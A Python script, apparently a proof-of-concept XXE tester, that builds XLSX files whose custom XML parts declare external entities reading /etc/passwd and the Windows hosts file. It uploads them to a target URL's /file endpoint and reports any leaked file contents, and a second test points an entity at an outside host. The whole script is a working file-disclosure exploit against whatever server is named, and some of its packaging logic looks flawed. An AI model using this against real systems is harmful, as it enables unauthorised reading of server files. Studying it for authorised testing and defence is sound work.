import requests
import zipfile
import xml.etree.ElementTree as ET
import io
from urllib.parse import urljoin


def create_malicious_xlsx():
    """
    创建一个恶意的XLSX文件，其中包含XXE payload
    XLSX文件本质上是一个ZIP压缩包，包含XML文件
    """
    
    # 创建一个内存中的ZIP文件
    xlsx_buffer = io.BytesIO()
    
    # 创建恶意的XML内容
    malicious_xml_content = '''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<!DOCTYPE root [
<!ELEMENT root ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<test>&file;</test>
</root>'''
    
    # 创建一个基本的XLSX结构
    # 创建临时目录结构
    import tempfile
    import os
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建基本的XLSX目录结构
        xl_dir = os.path.join(tmpdir, 'xl')
        os.makedirs(xl_dir)
        
        # 创建工作簿文件
        workbook_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>'''
        
        with open(os.path.join(xl_dir, 'workbook.xml'), 'w', encoding='utf-8') as f:
            f.write(workbook_xml)
        
        # 创建内容类型文件
        content_types_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>'''
        
        with open(os.path.join(tmpdir, '[Content_Types].xml'), 'w', encoding='utf-8') as f:
            f.write(content_types_xml)
        
        # 创建关系文件
        rels_dir = os.path.join(tmpdir, '_rels')
        os.makedirs(rels_dir)
        
        rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
        
        with open(os.path.join(rels_dir, '.rels'), 'w', encoding='utf-8') as f:
            f.write(rels_xml)
        
        # 创建自定义XML映射作为潜在的XXE载体
        custom_xml_dir = os.path.join(xl_dir, 'customXml')
        os.makedirs(custom_xml_dir)
        
        # 创建一个包含XXE的XML文件
        xxe_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">  <!-- Linux -->
<!ENTITY file2 SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">  <!-- Windows -->
]>
<root>
    <data>&file;&file2;</data>
</root>'''
        
        with open(os.path.join(custom_xml_dir, 'item1.xml'), 'w', encoding='utf-8') as f:
            f.write(xxe_xml)
        
        # 创建映射关系
        map_rels_dir = os.path.join(custom_xml_dir, '_rels')
        os.makedirs(map_rels_dir)
        
        map_rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXmlProps" Target="../customXml/itemProps1.xml"/>
</Relationships>'''
        
        with open(os.path.join(map_rels_dir, 'item1.xml.rels'), 'w', encoding='utf-8') as f:
            f.write(map_rels_xml)
        
        # 创建属性文件
        with open(os.path.join(custom_xml_dir, 'itemProps1.xml'), 'w', encoding='utf-8') as f:
            f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml">
    <ds:schemaRefs>
        <ds:schemaRef uri="http://schemas.customxml.com/schema1"/>
    </ds:schemaRefs>
</ds:datastoreItem>''')
        
        # 将目录打包成ZIP文件（即XLSX文件）
        import shutil
        zip_path = os.path.join(tmpdir, 'malicious.xlsx')
        shutil.make_archive(zip_path.replace('.xlsx', ''), 'zip', tmpdir)
        
        # 读取生成的ZIP并返回
        with open(zip_path, 'rb') as f:
            xlsx_data = f.read()
        
        return xlsx_data


def test_xxe_vulnerability(base_url):
    """
    测试XXE漏洞
    """
    print(f"Testing XXE vulnerability at {base_url}/file")
    
    # 创建恶意XLSX文件
    malicious_file_data = create_malicious_xlsx()
    
    # 准备POST请求
    url = urljoin(base_url, '/file')
    files = {'file': ('malicious.xlsx', malicious_file_data, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')}
    
    try:
        response = requests.post(url, files=files, timeout=10)
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Body: {response.text[:500]}...")  # 只显示前500字符
        
        # 检查响应中是否包含敏感文件内容（如passwd或hosts的内容）
        if 'root:' in response.text or 'localhost' in response.text.lower():
            print("\n[CRITICAL] XXE VULNERABILITY DETECTED!")
            print("[CRITICAL] The application is vulnerable to XXE attack.")
            print("[CRITICAL] Sensitive file content was retrieved.")
            return True
        else:
            print("\n[INFO] No obvious XXE vulnerability detected (no sensitive content leaked)")
            print("[INFO] However, the application may still be vulnerable to other XXE attacks")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False


def test_xxe_with_external_entity(base_url):
    """
    测试外部实体引用
    """
    print(f"\nTesting XXE with external entity at {base_url}/file")
    
    # 创建另一个恶意文件，尝试连接到外部服务
    import tempfile
    import os
    import shutil
    
    xlsx_buffer = io.BytesIO()
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # 创建基本的XLSX目录结构
        xl_dir = os.path.join(tmpdir, 'xl')
        os.makedirs(xl_dir)
        
        # 创建工作簿文件
        workbook_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheets>
        <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>'''
        
        with open(os.path.join(xl_dir, 'workbook.xml'), 'w', encoding='utf-8') as f:
            f.write(workbook_xml)
        
        # 创建内容类型文件
        content_types_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>'''
        
        with open(os.path.join(tmpdir, '[Content_Types].xml'), 'w', encoding='utf-8') as f:
            f.write(content_types_xml)
        
        # 创建关系文件
        rels_dir = os.path.join(tmpdir, '_rels')
        os.makedirs(rels_dir)
        
        rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
        
        with open(os.path.join(rels_dir, '.rels'), 'w', encoding='utf-8') as f:
            f.write(rels_xml)
        
        # 创建自定义XML映射，包含对外部资源的引用
        custom_xml_dir = os.path.join(xl_dir, 'customXml')
        os.makedirs(custom_xml_dir)
        
        # 创建一个包含外部实体的XML文件
        external_entity_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY >
<!ENTITY external SYSTEM "http://httpbin.org/user-agent">  <!-- Testing external reference -->
]>
<root>
    <data>&external;</data>
</root>'''
        
        with open(os.path.join(custom_xml_dir, 'item1.xml'), 'w', encoding='utf-8') as f:
            f.write(external_entity_xml)
        
        # 创建映射关系
        map_rels_dir = os.path.join(custom_xml_dir, '_rels')
        os.makedirs(map_rels_dir)
        
        map_rels_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXmlProps" Target="../customXml/itemProps1.xml"/>
</Relationships>'''
        
        with open(os.path.join(map_rels_dir, 'item1.xml.rels'), 'w', encoding='utf-8') as f:
            f.write(map_rels_xml)
        
        # 创建属性文件
        with open(os.path.join(custom_xml_dir, 'itemProps1.xml'), 'w', encoding='utf-8') as f:
            f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml">
    <ds:schemaRefs>
        <ds:schemaRef uri="http://schemas.customxml.com/schema1"/>
    </ds:schemaRefs>
</ds:datastoreItem>''')
        
        # 打包成ZIP文件
        zip_path = os.path.join(tmpdir, 'external_entity.xlsx')
        shutil.make_archive(zip_path.replace('.xlsx', ''), 'zip', tmpdir)
        
        # 读取生成的文件
        with open(zip_path, 'rb') as f:
            xlsx_data = f.read()
    
    # 发送请求
    url = urljoin(base_url, '/file')
    files = {'file': ('external_entity.xlsx', xlsx_data, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')}
    
    try:
        response = requests.post(url, files=files, timeout=10)
        print(f"Response Status Code: {response.status_code}")
        print(f"Response Body: {response.text[:500]}...")
        
        # 检查是否发生了外部连接（理论上不应该发生）
        if response.status_code == 200 and ('success' in response.text.lower()):
            print("\n[WARNING] File processed successfully - application may be vulnerable to XXE")
            return True
        else:
            print("\n[INFO] Request was blocked or failed - XXE protection may be working")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"Request failed (this could indicate XXE protection is working): {e}")
        return False


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python xxe_test.py <base_url>")
        print("Example: python xxe_test.py http://localhost:9099")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    print("="*60)
    print("XXE Vulnerability Test Script")
    print("="*60)
    
    # 测试本地文件包含
    vuln_detected = test_xxe_vulnerability(base_url)
    
    # 测试外部实体引用
    external_vuln = test_xxe_with_external_entity(base_url)
    
    print("\n" + "="*60)
    if vuln_detected or external_vuln:
        print("RESULT: VULNERABLE - The application is susceptible to XXE attacks")
    else:
        print("RESULT: LIKELY SECURE - No obvious XXE vulnerabilities detected")
    print("="*60)